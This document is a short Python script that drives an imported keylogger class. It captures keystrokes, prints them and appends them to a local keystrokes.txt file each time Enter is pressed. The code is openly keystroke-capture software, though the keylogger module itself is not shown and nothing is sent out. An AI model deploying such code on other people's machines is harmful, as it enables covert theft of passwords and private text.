import keyboard
import keylogger

def endAndRestartKeylogger(keylogger_instance):
    stoppedRecording = keylogger_instance.stopRecording()
    keysPressed = keylogger_instance.getTypedStrings(stoppedRecording)
    keystrokes = keylogger_instance.writeKeysPressed(keysPressed)
    print(keystrokes)
    keylogger_instance.startRecording()
    return keystrokes

def main():

    keylogger_instance = keylogger.Keylogger()

    keylogger_instance.startRecording()

    while True:
        keyboard.wait('enter')
        keystrokes = endAndRestartKeylogger(keylogger_instance)
        file = open("keystrokes.txt", "a")
        file.write(keystrokes + "\nPRESSED ENTER HERE\n\n")
        file.close()
        if input() == "q":
            break


main()
